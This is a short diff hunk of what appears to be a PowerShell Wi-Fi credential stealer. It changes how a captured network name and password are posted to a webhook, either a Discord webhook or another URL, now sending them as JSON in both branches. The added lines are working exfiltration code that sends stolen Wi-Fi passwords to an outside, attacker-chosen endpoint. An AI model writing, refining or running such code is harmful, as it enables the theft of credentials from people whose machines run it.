@@ -21,5 +21,8 @@ if ($webhookUrl.Contains('discord.com/api/webhooks/')) {
 "@
   Invoke-WebRequest -ContentType 'Application/Json' -Uri "$webhookUrl" -Method Post -Body ($json)
 } else {
-  Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid  : $pass"
+$json = @"
+  {"$ssid":"$pass"}
+"@
+  Invoke-WebRequest -ContentType 'Application/Json' -Uri "$webhookUrl" -Method Post -Body ($json)
 }
